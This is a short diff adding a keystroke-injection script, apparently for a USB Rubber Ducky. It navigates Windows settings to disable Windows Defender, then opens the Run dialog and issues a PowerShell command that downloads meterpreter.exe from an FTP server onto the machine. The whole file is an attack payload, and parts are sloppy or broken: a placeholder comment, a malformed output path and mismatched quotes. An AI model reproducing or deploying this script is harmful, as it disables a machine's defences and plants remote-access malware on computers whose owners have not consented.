@@ -1,0 +1,24 @@
+REM disables windows defender via settings gui
+DELAY 2000
+ESCAPE
+DELAY 100
+CONTROL ESCAPE
+DELAY 100
+STRING Windows Defender Settings
+ENTER
+DELAY 2000
+TAB
+DELAY 50
+DELAY 50
+ALT F4
+DELAY 3200
+REM windows + a = ????
+GUI a 
+DELAY 500
+ENTER
+DELAY 100
+GUI a
+REM downloads meterpreter from my ftp server
+GUI r
+STRING powershell Invoke-WebRequest -uri "ftp://192.168.1.3:2121/meterpreter.exe" -OutFile "C\meterpreter.exe”
+ALT F4
